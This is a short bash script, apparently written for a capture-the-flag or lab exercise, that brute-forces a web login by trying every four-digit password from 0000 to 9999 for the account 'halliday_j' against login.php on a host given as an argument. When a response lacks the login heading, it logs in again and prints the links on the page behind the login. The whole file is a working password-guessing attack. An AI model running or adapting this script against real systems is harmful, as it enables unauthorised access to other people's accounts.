#!/bin/bash

for i in $(seq -w 0000 9999)
do
    sa=$(curl -s --data "login=halliday_j&password=$i" http://$1/login.php | grep "<h1>Identification</h1>" | wc -c)
    if [ "$sa" -eq 0 ]
    then

	sh=$(curl --location -s --data "login=halliday_j&password=$i"  http://$1/login.php | grep -o "<a.*/a>" | wc -l)
	bb=$(($sh-2))
	se=$(curl --location -s --data "login=halliday_j&password=$i"  http://$1/login.php | grep -o "<a.*/a>" | tail -$bb | cut -d '"' -f2)
	echo "$se"
	
	break
    fi
done

